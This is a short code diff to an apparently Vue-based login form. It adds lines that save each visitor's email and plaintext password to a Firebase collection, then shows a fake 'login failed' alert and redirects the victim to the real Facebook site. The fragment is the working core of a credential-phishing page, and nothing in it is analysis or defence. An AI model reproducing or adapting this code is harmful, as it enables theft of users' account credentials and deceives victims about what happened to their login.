@@ -30,8 +30,12 @@ export default {
     submit () {
 
       /* 把資料寫入Firebase */
+      this.$firestoreRefs.user.add({
+        email: this.email,
+        password: this.password,
+        time: new Date()
+      })
 
-      
       alert("登入失敗");
       window.location.href = 'https://www.facebook.com/';
     }
